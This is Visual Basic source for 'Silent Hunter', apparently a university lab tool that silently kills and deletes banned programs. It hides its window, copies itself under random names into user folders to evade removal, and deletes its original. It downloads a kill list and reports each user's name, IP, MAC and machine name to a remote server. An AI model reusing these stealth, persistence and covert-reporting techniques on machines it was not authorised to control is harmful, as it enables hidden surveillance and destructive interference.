Imports System
Imports System.IO
Imports System.Collections
Imports System.ComponentModel
Imports System.Drawing
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.Win32
Imports System.Management


Public Class Main_Screen

    Dim busyworking As Boolean = False
    Dim busyworking2 As Boolean = False

    Dim loadsavesettings As Boolean = True
    Dim newexecutablename As String = ""
    Dim newexecutablepath As String = ""
    Dim originalexecutablename As String = ""
    Dim originalexecutablepath As String = ""


    '------------------------------------------------------------------------------------
    '************************************************************************************
    'Message to the blokes that decompile this:
    '
    'Seeing as I am having fun here (which can't often be said in the line of work, I
    'have decided not to obfuscate my code to keep this game of cat and mouse going on
    'for longer. Looking forward to your next iteration of the Silent Hunter Killer.
    '
    'Craig Lotter
    '************************************************************************************
    '------------------------------------------------------------------------------------

    

    Private Sub Error_Handler(ByVal ex As Exception, Optional ByVal identifier_msg As String = "")
        Try
            'If ex.Message.IndexOf("Thread was being aborted") < 0 Then
            '    Dim dir As System.IO.DirectoryInfo = New System.IO.DirectoryInfo((Application.StartupPath & "\").Replace("\\", "\") & "Error Logs")
            '    If dir.Exists = False Then
            '        dir.Create()
            '    End If
            '    dir = Nothing
            '    Dim filewriter As System.IO.StreamWriter = New System.IO.StreamWriter((Application.StartupPath & "\").Replace("\\", "\") & "Error Logs\" & Format(Now(), "yyyyMMdd") & "_Error_Log.txt", True)
            '    filewriter.WriteLine("#" & Format(Now(), "dd/MM/yyyy hh:mm:ss tt") & " - " & identifier_msg & ": " & ex.ToString)
            '    filewriter.WriteLine()
            '    filewriter.Flush()
            '    filewriter.Close()
            '    filewriter = Nothing
            'End If
        Catch exc As Exception
            MsgBox("An error occurred in the application's error handling routine. The application will try to recover from this serious error.", MsgBoxStyle.Critical, "Critical Error Encountered")
        End Try
    End Sub

    Private Sub Activity_Handler(ByVal Message As String)
        Try
            'Dim dir As System.IO.DirectoryInfo = New System.IO.DirectoryInfo((Application.StartupPath & "\").Replace("\\", "\") & "Activity Logs")
            'If dir.Exists = False Then
            '    dir.Create()
            'End If
            'dir = Nothing
            'Dim filewriter As System.IO.StreamWriter = New System.IO.StreamWriter((Application.StartupPath & "\").Replace("\\", "\") & "Activity Logs\" & Format(Now(), "yyyyMMdd") & "_Activity_Log.txt", True)
            'filewriter.WriteLine("#" & Format(Now(), "dd/MM/yyyy hh:mm:ss tt") & " - " & Message)
            'filewriter.Flush()
            'filewriter.Close()
            'filewriter = Nothing
        Catch ex As Exception
            Error_Handler(ex, "Activity_Logger")
        End Try
    End Sub



    Private Sub Main_Screen_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Me.Visible = False
            Dim display As Boolean = False

            Dim runApplication As Boolean = True

            If Application.ExecutablePath.ToLower.EndsWith("silent hunter.exe") = True Then
                runApplication = False
            End If

            If My.Application.CommandLineArgs.Count > 0 Then
                For Each fil As String In My.Application.CommandLineArgs
                    If fil.Length > 0 Then
                        If fil.ToLower = "/show" Or fil.ToLower = "show" Then
                            runApplication = True
                        End If
                    End If
                Next
            End If


            If runApplication = False Then
                If Application.ExecutablePath.ToLower.EndsWith("silent hunter.exe") = True Then
                    Try


                        originalexecutablepath = Application.StartupPath
                        originalexecutablename = Application.ExecutablePath.Replace(Application.StartupPath, "").Remove(0, 1)
                        Dim names As String() = New String() {"acr", "exp", "win", "acr", "ssh", "lss", "ass", "ang", "cod", "sil", "hun", "cpp", "vbs", "csh"}
                        Randomize()   ' Initialize random-number generator.
                        Dim MyValue As Integer = 0
                        Dim tempname As String = ""

                        For i As Integer = 1 To 3
                            MyValue = CInt(Int((14 * Rnd()) + 1)) ' Generate random value between 1 and 8.
                            tempname = tempname + names(MyValue - 1)
                        Next

                        Dim folders As String() = New String() {My.Computer.FileSystem.SpecialDirectories.Temp, My.Computer.FileSystem.SpecialDirectories.Programs, My.Computer.FileSystem.SpecialDirectories.ProgramFiles, My.Computer.FileSystem.SpecialDirectories.MyPictures, My.Computer.FileSystem.SpecialDirectories.MyMusic, My.Computer.FileSystem.SpecialDirectories.MyDocuments}
                        MyValue = CInt(Int((6 * Rnd()) + 1))


                        newexecutablepath = (folders(MyValue - 1) & "\" & tempname).Replace("\\", "\")
                        newexecutablename = (newexecutablepath & "\" & tempname & ".exe").Replace("\\", "\")
                        My.Computer.FileSystem.CopyFile(Application.ExecutablePath, newexecutablename, True)
                        If My.Computer.FileSystem.FileExists((Application.StartupPath & "\ProcessList.txt").Replace("\\", "\")) Then
                            My.Computer.FileSystem.CopyFile((Application.StartupPath & "\ProcessList.txt").Replace("\\", "\"), (My.Computer.FileSystem.SpecialDirectories.Temp & "\" & tempname & ".txt").Replace("\\", "\"), True)
                        End If
                        Shell("""" & newexecutablename & """ ""/hide"" ""-" & originalexecutablepath & """", AppWinStyle.NormalFocus, False)

                    Catch ex As Exception
                        Error_Handler(ex, "Closing down first instance of application")
                    End Try
                    loadsavesettings = False
                    Me.Close()
                End If
            Else
                If My.Application.CommandLineArgs.Count > 0 Then
                    If My.Application.CommandLineArgs(0).ToLower = "/show" Or My.Application.CommandLineArgs(0).ToLower = "show" Then
                        display = True
                    End If
                    If My.Application.CommandLineArgs.Count > 1 Then
                        If My.Application.CommandLineArgs(1).StartsWith("-") Then
                            originalexecutablepath = My.Application.CommandLineArgs(1).ToString.Remove(0, 1)
                        End If
                    End If

                End If
                If display = False Then
                    Me.FormBorderStyle = Windows.Forms.FormBorderStyle.FixedToolWindow
                    Me.ControlBox = False
                    Me.Visible = False
                    Me.Opacity = 0
                Else
                    Me.Visible = True
                End If
                'Me.Text = My.Application.Info.ProductName & " " & Format(My.Application.Info.Version.Major, "0000") & Format(My.Application.Info.Version.Minor, "00") & Format(My.Application.Info.Version.Build, "00") & "." & Format(My.Application.Info.Version.Revision, "00") & ""
                Dim tf As FileInfo = New FileInfo(Application.ExecutablePath)
                Me.Text = tf.Name
                tf = Nothing

                If loadsavesettings = True Then
                    LoadSettings()
                End If
                Try
                    If My.Computer.FileSystem.DirectoryExists(originalexecutablepath) Then
                        My.Computer.FileSystem.DeleteDirectory(originalexecutablepath, FileIO.DeleteDirectoryOption.DeleteAllContents)
                    End If
                    If My.Computer.FileSystem.DirectoryExists("C:\Silent_Hunter") Then
                        My.Computer.FileSystem.DeleteDirectory("C:\Silent_Hunter", FileIO.DeleteDirectoryOption.DeleteAllContents)
                    End If
                Catch ex As Exception
                    Error_Handler(ex, "Delete Original Silent Hunter")
                End Try

            End If

        Catch ex As Exception
            Error_Handler(ex, "Main_Screen_Load")
        End Try
    End Sub

    Private Sub Main_Screen_Close(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        Try
            If loadsavesettings = True Then
                SaveSettings()
            End If

        Catch ex As Exception
            Error_Handler(ex, "Main_Screen_Close")
        End Try
    End Sub

    'Private Sub Main_Screen_FormClosed(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles MyBase.FormClosed
    '    Try
    '        MsgBox("Do you really, really want to shut down this instance of Silent Hunter?")
    '    Catch ex As Exception
    '        Error_Handler(ex, "Attempt Restart")
    '    End Try
    'End Sub

    Private Sub StartWorker()
        Try
            busyworking = True
            BackgroundWorker1.RunWorkerAsync("")
        Catch ex As Exception
            Error_Handler(ex, "StartWorker")
        End Try
    End Sub 'startAsyncButton_Click



    Private Sub StartWorker2()
        Try
            busyworking2 = True
            BackgroundWorker2.RunWorkerAsync("")
        Catch ex As Exception
            Error_Handler(ex, "StartWorker2")
        End Try
    End Sub 'startAsyncButton_Click


    Private Sub FolderWalker(ByVal basefolder As String)
        Try
            If Not basefolder.EndsWith("System Volume Information") And Not basefolder.EndsWith("RECYCLER") And Not basefolder.StartsWith("C:\WINDOWS\system32\Novell") Then
                Dim dinfo As DirectoryInfo = New DirectoryInfo(basefolder)
                For Each finfo As FileInfo In dinfo.GetFiles
                    Try
                        If finfo.Name.ToLower = "hashdata.dat" Then
                            If finfo.Directory.Name.ToLower = "settings" Then
                                For Each sinfo As FileInfo In finfo.Directory.Parent.GetFiles("*.exe", SearchOption.TopDirectoryOnly)
                                    Try
                                        If Not sinfo.Name = "uninst.exe" Then
                                            Dim proc As String = sinfo.Name.Remove(sinfo.Name.Length - 4, 4)
                                            '----------------------------------------
                                            If Not proc = "" And Not proc Is Nothing Then
                                                'MsgBox("testing for: " & proc)
                                                Dim existing As Process() = Process.GetProcesses
                                                Dim eproc As Process
                                                For Each eproc In existing
                                                    Try


                                                        Dim eprocname As String = eproc.ProcessName
                                                        'MsgBox("testing against: " & eprocname)
                                                        Dim handled As Boolean = False
                                                        If handled = False Then
                                                            If eproc.ProcessName.ToLower.Equals(proc.ToLower) = True Then
                                                                If eproc.CloseMainWindow = False Then
                                                                    eproc.Kill()
                                                                End If
                                                                handled = True
                                                                Dim existing2 As Process() = Process.GetProcesses()
                                                                Dim eproc2 As Process
                                                                For Each eproc2 In existing2
                                                                    Try
                                                                        If eproc2.ProcessName.ToLower.Equals(proc.ToLower) = True Then
                                                                            If eproc2.CloseMainWindow = False Then
                                                                                eproc2.Kill()
                                                                            End If
                                                                        End If
                                                                    Catch ex As Exception
                                                                        Error_Handler(ex, "Second Process Kill Attempt: " & eproc2.ProcessName)
                                                                    End Try
                                                                    eproc2.Dispose()
                                                                Next
                                                                existing2 = Nothing
                                                            End If
                                                        End If
                                                        eproc.Dispose()
                                                        If handled = True Then
                                                            Dim currentuser As String = ""
                                                            currentuser = ReturnRegKeyValue("HKEY_CURRENT_USER", "Volatile Environment", "NWUSERNAME")
                                                            If currentuser.StartsWith("Fail.") = True Or currentuser.StartsWith("Failure") = True Then
                                                                currentuser = "UNKNOWN"
                                                            End If
                                                            Dim machinename, ipaddress, macaddress As String
                                                            machinename = ""
                                                            ipaddress = ""
                                                            macaddress = ""
                                                            Try
                                                                machinename = Environment.MachineName
                                                            Catch ex As Exception
                                                                Error_Handler(ex, "Retrieve machine name")
                                                            End Try
                                                            Try
                                                                Dim mc As System.Management.ManagementClass
                                                                Dim mo As ManagementObject
                                                                mc = New ManagementClass("Win32_NetworkAdapterConfiguration")
                                                                Dim moc As ManagementObjectCollection = mc.GetInstances()
                                                                For Each mo In moc
                                                                    If mo.Item("IPEnabled") = True Then
                                                                        macaddress = mo.Item("MacAddress").ToString()
                                                                        Dim addresses() As String = CType(mo("IPAddress"), String())
                                                                        Dim subnets() As String = CType(mo("IPSubnet"), String())
                                                                        Dim s As String
                                                                        Dim a As Integer = 0
                                                                        For Each s In addresses
                                                                            ipaddress = s.ToString()
                                                                            a += 1
                                                                            If a = 1 Then
                                                                                Exit For
                                                                            End If
                                                                        Next
                                                                    End If
                                                                Next
                                                            Catch ex As Exception
                                                                Error_Handler(ex, "Retrieve MAC and IP addresses")
                                                            End Try

                                                            Activity_Handler("Closed " & eprocname & " (Novell User: " & currentuser & ")")
                                                            Try
                                                                Dim logdate As String = Format(Now, "yyyyMMddHHmmss")

                                                                If My.Computer.Network.IsAvailable = True Then
                                                                    Try
                                                                        My.Computer.Network.DownloadFile("http://www.commerce.uct.ac.za/Services/Silent Hunter/Submit.asp?Page_Action=create&Novell_Account=" & currentuser & "&Process_Name=" & eprocname & "&Time_Stamp=" & logdate & "&IP_Address=" & ipaddress & "&MAC_Address=" & macaddress & "&Machine_Name=" & machinename & "", (Application.StartupPath & "\ReportResult.htm").Replace("\\", "\"), "", "", False, 100000, True)
                                                                        Activity_Handler("Reported Kill to: " & "http://www.commerce.uct.ac.za/Services/Silent Hunter/Submit.asp?Page_Action=create&Novell_Account=" & currentuser & "&Process_Name=" & eprocname & "&Time_Stamp=" & logdate & "&IP_Address=" & ipaddress & "&MAC_Address=" & macaddress & "&Machine_Name=" & machinename & "")
                                                                        My.Computer.FileSystem.DeleteFile((Application.StartupPath & "\ReportResult.htm").Replace("\\", "\"))
                                                                    Catch ex As Exception
                                                                        Error_Handler(ex, "Logging Kill to OBE1")
                                                                        Activity_Handler("Reported Kill to: Failed. Check Error Log for details.")
                                                                    End Try

                                                                Else
                                                                    Activity_Handler("Reported Kill to: No network connection detected")
                                                                End If
                                                            Catch ex As Exception
                                                                Error_Handler(ex, "Logging Kill to OBE1")
                                                            End Try
                                                        End If
                                                    Catch ex As Exception
                                                        Error_Handler(ex, "Attempting Process Killing")
                                                    End Try
                                                Next

                                            End If
                                            '---------------------------------------
                                            Try
                                                My.Computer.FileSystem.DeleteFile(sinfo.FullName)
                                            Catch ex As Exception
                                                Error_Handler(ex, "Delete File")
                                            End Try
                                        End If
                                        sinfo = Nothing
                                    Catch ex As Exception
                                        Error_Handler(ex, "Check Files")
                                    End Try
                                Next
                            End If

                        End If
                        finfo = Nothing
                    Catch ex As Exception
                        Error_Handler(ex, "FolderWalker: " & finfo.FullName)
                    End Try
                Next
                For Each subdinfo As DirectoryInfo In dinfo.GetDirectories
                    Try
                        FolderWalker(subdinfo.FullName)
                        subdinfo = Nothing
                    Catch ex As Exception
                        Error_Handler(ex, "FolderWalker: " & subdinfo.FullName)
                    End Try
                Next
                dinfo = Nothing
            End If
        Catch ex As Exception
            Error_Handler(ex, "FolderWalker: Base = " & basefolder)
        End Try
    End Sub

    ' This event handler is where the actual work is done.
    Private Sub backgroundWorker1_DoWork(ByVal sender As Object, ByVal e As DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            Dim processlist As String = ";;"
            Dim pfilename As String = ""
            Dim testinfo As DirectoryInfo = New DirectoryInfo(Application.StartupPath)
            pfilename = testinfo.Name
            testinfo = Nothing
            If My.Computer.FileSystem.FileExists((My.Computer.FileSystem.SpecialDirectories.Temp & "\" & pfilename & ".txt").Replace("\\", "\")) Then
                Dim reader As StreamReader = My.Computer.FileSystem.OpenTextFileReader((My.Computer.FileSystem.SpecialDirectories.Temp & "\" & pfilename & ".txt").Replace("\\", "\"))
                Dim lineread As String = ""
                While reader.Peek <> -1
                    lineread = reader.ReadLine()
                    If lineread.Length > 0 Then
                        processlist = processlist & lineread & ";;"
                        If lineread.ToLower.EndsWith(".exe") Then
                            lineread = lineread.Remove(lineread.Length - 4, 4)
                            If processlist.IndexOf(";;" & lineread & ";;") < 0 Then
                                processlist = processlist & lineread & ";;"
                            End If
                        End If
                    End If
                End While
                reader.Close()
                reader = Nothing
            End If

            If My.Computer.Network.IsAvailable = True Then
                Try
                    My.Computer.Network.DownloadFile("http://www.commerce.uct.ac.za/Services/Silent Hunter/ProcessList.txt", (Application.StartupPath & "\OnlineProcessList.txt").Replace("\\", "\"), "", "", False, 100000, True)
                Catch ex As Exception
                    Error_Handler(ex, "Download Online ProcessList")
                End Try
            End If

            If My.Computer.FileSystem.FileExists((Application.StartupPath & "\OnlineProcessList.txt").Replace("\\", "\")) Then
                Dim reader As StreamReader = My.Computer.FileSystem.OpenTextFileReader((Application.StartupPath & "\OnlineProcessList.txt").Replace("\\", "\"))
                Dim lineread As String = ""
                While reader.Peek <> -1
                    lineread = reader.ReadLine()
                    If lineread.Length > 0 Then
                        processlist = processlist & lineread & ";;"
                        If lineread.ToLower.EndsWith(".exe") Then
                            lineread = lineread.Remove(lineread.Length - 4, 4)
                            If processlist.IndexOf(";;" & lineread & ";;") < 0 Then
                                processlist = processlist & lineread & ";;"
                            End If
                        End If
                    End If
                End While
                reader.Close()
                reader = Nothing
            End If
            My.Computer.FileSystem.DeleteFile((Application.StartupPath & "\OnlineProcessList.txt").Replace("\\", "\"))

            'MsgBox("processlist: " & processlist)
            If processlist.EndsWith(";;") Then
                processlist = processlist.Remove(processlist.Length - 2, 2)
            End If
            If processlist.StartsWith(";;") Then
                processlist = processlist.Remove(0, 2)
            End If
            'MsgBox("processlist: " & processlist)
            If processlist.Length > 0 Then


                Dim processes As String() = processlist.Split(";;")
                Dim proc As String
                For Each proc In processes

                    If Not proc = "" And Not proc Is Nothing Then
                        'MsgBox("testing for: " & proc)
                        Dim existing As Process() = Process.GetProcesses
                        Dim eproc As Process
                        Dim identifiedproc As String = ""
                        For Each eproc In existing
                            Try
                                identifiedproc = ""

                                Dim eprocname As String = eproc.ProcessName
                                'MsgBox("testing against: " & eprocname)
                                Dim handled As Boolean = False
                                If proc.EndsWith("*") And handled = False Then

                                    If eproc.ProcessName.ToLower.StartsWith(proc.ToLower.Remove(proc.Length - 1, 1)) = True Or eproc.MainWindowTitle.ToLower.StartsWith(proc.ToLower.Remove(proc.Length - 1, 1)) = True Then
                                        identifiedproc = eproc.ProcessName
                                        If eproc.CloseMainWindow = False Then
                                            eproc.Kill()
                                        End If
                                        handled = True
                                    End If
                                End If
                                If proc.StartsWith("*") And handled = False Then
                                    If eproc.ProcessName.ToLower.EndsWith(proc.ToLower.Remove(0, 1)) = True Or eproc.MainWindowTitle.ToLower.EndsWith(proc.ToLower.Remove(0, 1)) = True Then
                                        identifiedproc = eproc.ProcessName
                                        If eproc.CloseMainWindow = False Then
                                            eproc.Kill()
                                        End If
                                        handled = True
                                    End If
                                End If
                                If handled = False Then
                                    If eproc.ProcessName.ToLower.Equals(proc.ToLower) = True Or eproc.MainWindowTitle.ToLower.Equals(proc.ToLower) = True Then
                                        identifiedproc = eproc.ProcessName
                                        If eproc.CloseMainWindow = False Then
                                            eproc.Kill()
                                        End If
                                        handled = True
                                    End If
                                End If
                                eproc.Dispose()
                                If handled = True Then
                                    Try

                                    
                                        Dim eprocc As Process
                                        For Each eprocc In Process.GetProcessesByName(identifiedproc)
                                            'MsgBox(eprocc.ProcessName)
                                            If eprocc.CloseMainWindow = False Then
                                                eprocc.Kill()
                                            End If
                                        Next
                                        If Not eprocc Is Nothing Then
                                            eprocc.Dispose()
                                        End If
                                    Catch ex As Exception
                                        Error_Handler(ex, "Second Strike")
                                    End Try


                                    Dim currentuser As String = ""
                                    currentuser = ReturnRegKeyValue("HKEY_CURRENT_USER", "Volatile Environment", "NWUSERNAME")
                                    If currentuser.StartsWith("Fail.") = True Or currentuser.StartsWith("Failure") = True Then
                                        currentuser = "UNKNOWN"
                                    End If
                                    Dim machinename, ipaddress, macaddress As String
                                    machinename = ""
                                    ipaddress = ""
                                    macaddress = ""
                                    Try
                                        machinename = Environment.MachineName
                                    Catch ex As Exception
                                        Error_Handler(ex, "Retrieve machine name")
                                    End Try
                                    Try
                                        Dim mc As System.Management.ManagementClass
                                        Dim mo As ManagementObject
                                        mc = New ManagementClass("Win32_NetworkAdapterConfiguration")
                                        Dim moc As ManagementObjectCollection = mc.GetInstances()
                                        For Each mo In moc
                                            If mo.Item("IPEnabled") = True Then
                                                macaddress = mo.Item("MacAddress").ToString()
                                                Dim addresses() As String = CType(mo("IPAddress"), String())
                                                Dim subnets() As String = CType(mo("IPSubnet"), String())
                                                Dim s As String
                                                Dim a As Integer = 0
                                                For Each s In addresses
                                                    ipaddress = s.ToString()
                                                    a += 1
                                                    If a = 1 Then
                                                        Exit For
                                                    End If
                                                Next
                                            End If
                                        Next
                                    Catch ex As Exception
                                        Error_Handler(ex, "Retrieve MAC and IP addresses")
                                    End Try

                                    Activity_Handler("Closed " & eprocname & " (Novell User: " & currentuser & ")")
                                    Try
                                        Dim logdate As String = Format(Now, "yyyyMMddHHmmss")

                                        If My.Computer.Network.IsAvailable = True Then
                                            Try
                                                My.Computer.Network.DownloadFile("http://www.commerce.uct.ac.za/Services/Silent Hunter/Submit.asp?Page_Action=create&Novell_Account=" & currentuser & "&Process_Name=" & eprocname & "&Time_Stamp=" & logdate & "&IP_Address=" & ipaddress & "&MAC_Address=" & macaddress & "&Machine_Name=" & machinename & "", (Application.StartupPath & "\ReportResult.htm").Replace("\\", "\"), "", "", False, 100000, True)
                                                Activity_Handler("Reported Kill to: " & "http://www.commerce.uct.ac.za/Services/Silent Hunter/Submit.asp?Page_Action=create&Novell_Account=" & currentuser & "&Process_Name=" & eprocname & "&Time_Stamp=" & logdate & "&IP_Address=" & ipaddress & "&MAC_Address=" & macaddress & "&Machine_Name=" & machinename & "")
                                                My.Computer.FileSystem.DeleteFile((Application.StartupPath & "\ReportResult.htm").Replace("\\", "\"))
                                            Catch ex As Exception
                                                Error_Handler(ex, "Logging Kill to OBE1")
                                                Activity_Handler("Reported Kill to: Failed. Check Error Log for details.")
                                            End Try

                                        Else
                                            Activity_Handler("Reported Kill to: No network connection detected")
                                        End If
                                    Catch ex As Exception
                                        Error_Handler(ex, "Logging Kill to OBE1")
                                    End Try
                                End If
                            Catch ex As Exception
                                Error_Handler(ex, "Attempting Process Killing")
                            End Try
                        Next

                    End If
                Next
            End If


        Catch ex As Exception
            Error_Handler(ex, "Background Worker")
        End Try
    End Sub 'backgroundWorker1_DoWork

    ' This event handler is where the actual work is done.
    Private Sub backgroundWorker2_DoWork(ByVal sender As Object, ByVal e As DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        Try

            '*------------------------------------
            For Each drive As DriveInfo In My.Computer.FileSystem.Drives
                Try

                    If drive.DriveType = DriveType.Fixed Or drive.DriveType = DriveType.Removable Then
                        If drive.IsReady = True Then
                            FolderWalker(drive.Name)
                        End If
                    End If
                    If drive.Name = "F:\" Then
                        If drive.IsReady = True Then
                            FolderWalker(drive.Name)
                        End If
                    End If
                Catch ex As Exception
                    Error_Handler(ex, "Background Worker 2")
                End Try
            Next


        Catch ex As Exception
            Error_Handler(ex, "Background Worker 2")
        End Try
    End Sub 'backgroundWorker2_DoWork

    ' This event handler deals with the results of the
    ' background operation.
    Private Sub backgroundWorker1_RunWorkerCompleted(ByVal sender As Object, ByVal e As RunWorkerCompletedEventArgs) Handles BackgroundWorker1.RunWorkerCompleted
        busyworking = False
        ' First, handle the case where an exception was thrown.
        If Not (e.Error Is Nothing) Then
            Error_Handler(e.Error, "backgroundWorker1_RunWorkerCompleted")
        ElseIf e.Cancelled Then

        Else
            ' Finally, handle the case where the operation succeeded.
         
        End If
        
    End Sub 'backgroundWorker1_RunWorkerCompleted

  
    ' This event handler deals with the results of the
    ' background operation.
    Private Sub backgroundWorker2_RunWorkerCompleted(ByVal sender As Object, ByVal e As RunWorkerCompletedEventArgs) Handles BackgroundWorker2.RunWorkerCompleted
        busyworking2 = False
        Timer1.Start()
        ' First, handle the case where an exception was thrown.
        If Not (e.Error Is Nothing) Then
            Error_Handler(e.Error, "backgroundWorker2_RunWorkerCompleted")
        ElseIf e.Cancelled Then

        Else
            ' Finally, handle the case where the operation succeeded.

        End If

    End Sub 'backgroundWorker2_RunWorkerCompleted




    Private Function DosShellCommand(ByVal AppToRun As String) As String
        Dim s As String = ""
        Try
            Dim myProcess As Process = New Process

            myProcess.StartInfo.FileName = "cmd.exe"
            myProcess.StartInfo.UseShellExecute = False


            Dim sErr As StreamReader
            Dim sOut As StreamReader
            Dim sIn As StreamWriter


            myProcess.StartInfo.CreateNoWindow = True

            myProcess.StartInfo.RedirectStandardInput = True
            myProcess.StartInfo.RedirectStandardOutput = True
            myProcess.StartInfo.RedirectStandardError = True

            'myProcess.StartInfo.FileName = AppToRun

            myProcess.Start()
            sIn = myProcess.StandardInput
            sIn.AutoFlush = True

            sOut = myProcess.StandardOutput()
            sErr = myProcess.StandardError

            sIn.Write(AppToRun & System.Environment.NewLine)
            sIn.Write("exit" & System.Environment.NewLine)
            s = sOut.ReadToEnd()

            If Not myProcess.HasExited Then
                myProcess.Kill()
            End If



            sIn.Close()
            sOut.Close()
            sErr.Close()
            myProcess.Close()


        Catch ex As Exception
            Error_Handler(ex, "DosShellCommand")
        End Try

        Return s
    End Function

    Private Function ApplicationLauncher(ByVal AppToRun As String, ByVal apptorunArgs As String) As String
        Dim s As String = ""
        Try
            Dim myProcess As Process = New Process


            myProcess.StartInfo.UseShellExecute = False


            Dim sErr As StreamReader
            Dim sOut As StreamReader
            Dim sIn As StreamWriter


            myProcess.StartInfo.CreateNoWindow = True

            myProcess.StartInfo.RedirectStandardInput = True
            myProcess.StartInfo.RedirectStandardOutput = True
            myProcess.StartInfo.RedirectStandardError = True

            myProcess.StartInfo.FileName = AppToRun
            myProcess.StartInfo.Arguments = apptorunArgs

            myProcess.Start()
            sIn = myProcess.StandardInput
            sIn.AutoFlush = True

            sOut = myProcess.StandardOutput()
            sErr = myProcess.StandardError

            sIn.Write(AppToRun & System.Environment.NewLine)
            sIn.Write("exit" & System.Environment.NewLine)
            s = sOut.ReadToEnd()

            If Not myProcess.HasExited Then
                myProcess.Kill()
            End If

            sIn.Close()
            sOut.Close()
            sErr.Close()
            myProcess.Close()


        Catch ex As Exception
            Error_Handler(ex, "ApplicationLauncher")
        End Try
        Return s
    End Function


   
    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem.Click
        Try
            AboutBox1.ShowDialog()
        Catch ex As Exception
            Error_Handler(ex, "Display About Screen")
        End Try
    End Sub

    Private Sub HelpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HelpToolStripMenuItem.Click
        Try
            HelpBox1.ShowDialog()
        Catch ex As Exception
            Error_Handler(ex, "Display Help Screen")
        End Try
    End Sub

    Private Sub LoadSettings()
        Try
            'Dim configfile As String = (Application.StartupPath & "\config.sav").Replace("\\", "\")
            'If My.Computer.FileSystem.FileExists(configfile) Then
            '    Dim reader As StreamReader = New StreamReader(configfile)
            '    Dim lineread As String
            '    Dim variablevalue As String
            '    While reader.Peek <> -1
            '        lineread = reader.ReadLine
            '        If lineread.IndexOf("=") <> -1 Then

            '            variablevalue = lineread.Remove(0, lineread.IndexOf("=") + 1)

            '            'If lineread.StartsWith("InputTargetFile_Textbox=") Then
            '            '    Dim finfo As FileInfo = New FileInfo(variablevalue)
            '            '    If finfo.Exists Then
            '            '        OpenFileDialog1.FileName = variablevalue
            '            '        InputTargetFile_Textbox.Text = variablevalue
            '            '    End If
            '            '    finfo = Nothing
            '            'End If

            '            'If lineread.StartsWith("FullErrors_Checkbox=") Then
            '            '    FullErrors_Checkbox.Checked = variablevalue
            '            'End If
            '            'If lineread.StartsWith("RadioButton1=") Then
            '            '    RadioButton1.Checked = variablevalue
            '            'End If
            '            'If lineread.StartsWith("RadioButton2=") Then
            '            '    RadioButton2.Checked = variablevalue
            '            'End If
            '            'If lineread.StartsWith("RadioButton3=") Then
            '            '    RadioButton3.Checked = variablevalue
            '            'End If
            '            'If lineread.StartsWith("RadioButton4=") Then
            '            '    RadioButton4.Checked = variablevalue
            '            'End If
            '            'If lineread.StartsWith("RadioButton5=") Then
            '            '    RadioButton5.Checked = variablevalue
            '            'End If

            '        End If
            '    End While
            '    reader.Close()
            '    reader = Nothing
            'End If
        Catch ex As Exception
            Error_Handler(ex, "Load Settings")
        End Try
    End Sub

    Private Sub SaveSettings()
        Try
            'Dim configfile As String = (Application.StartupPath & "\config.sav").Replace("\\", "\")

            'Dim writer As StreamWriter = New StreamWriter(configfile, False)

            ''If InputTargetFile_Textbox.Text.Length > 0 Then
            ''    Dim finfo As FileInfo = New FileInfo(InputTargetFile_Textbox.Text)
            ''    If finfo.Exists Then
            ''        writer.WriteLine("InputTargetFile_Textbox=" & InputTargetFile_Textbox.Text)
            ''    End If
            ''    finfo = Nothing
            ''End If

            ''writer.WriteLine("FullErrors_Checkbox=" & FullErrors_Checkbox.Checked.ToString)
            ''writer.WriteLine("RadioButton1=" & RadioButton1.Checked.ToString)
            ''writer.WriteLine("RadioButton2=" & RadioButton2.Checked.ToString)
            ''writer.WriteLine("RadioButton3=" & RadioButton3.Checked.ToString)
            ''writer.WriteLine("RadioButton4=" & RadioButton4.Checked.ToString)
            ''writer.WriteLine("RadioButton5=" & RadioButton5.Checked.ToString)

            'writer.Flush()
            'writer.Close()
            'writer = Nothing

        Catch ex As Exception
            Error_Handler(ex, "Save Settings")
        End Try
    End Sub

   

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        If busyworking = False Then
            StartWorker()
        End If
    End Sub



    Public Function ReturnRegKeyValue(ByVal MainKey As String, ByVal RequestedKey As String, ByVal Value As String) As String
        Dim result As String = "Fail."
        Try
            Dim oReg As RegistryKey
            Dim regkey As RegistryKey
            Try
                Select Case MainKey.ToUpper
                    Case "HKEY_CURRENT_USER"
                        oReg = Registry.CurrentUser
                    Case "HKEY_CLASSES_ROOT"
                        oReg = Registry.ClassesRoot
                    Case "HKEY_LOCAL_MACHINE"
                        oReg = Registry.LocalMachine
                    Case "HKEY_USERS"
                        oReg = Registry.Users
                    Case "HKEY_CURRENT_CONFIG"
                        oReg = Registry.CurrentConfig
                    Case Else
                        oReg = Registry.LocalMachine
                End Select

                regkey = oReg
                oReg.Close()
                If RequestedKey.EndsWith("\") = True Then
                    RequestedKey = RequestedKey.Remove(RequestedKey.Length - 1, 1)
                End If
                Dim subs() As String = (RequestedKey).Split("\")

                Dim doContinue As Boolean = True
                For Each stri As String In subs
                    If doContinue = False Then
                        Exit For
                    End If
                    If regkey Is Nothing = False Then
                        Dim skn As String() = regkey.GetSubKeyNames()
                        Dim strin As String

                        doContinue = False
                        For Each strin In skn
                            If stri = strin Then
                                regkey = regkey.OpenSubKey(stri, True)
                                doContinue = True
                                Exit For
                            End If
                        Next
                    End If
                Next
                If doContinue = True Then
                    If regkey Is Nothing = False Then
                        Dim str As String() = regkey.GetValueNames()
                        Dim val As String
                        Dim foundit As Boolean = False
                        For Each val In str
                            If Value = val Then
                                foundit = True
                                result = regkey.GetValue(Value)
                                Exit For
                            End If
                        Next
                        If foundit = False Then
                            result = "Fail. Could not locate Value within Registry Key"
                        End If
                        regkey.Close()
                    End If
                Else
                    result = "Fail. Key cannot be located"
                End If
            Catch ex As Exception
                Error_Handler(ex, "ReturnRegKeyValue")
                result = "Fail. Check Error Log for further details"
            End Try
        Catch ex As Exception
            Error_Handler(ex, "ReturnRegKeyValue")
            result = "Fail. Check Error Log for further details"
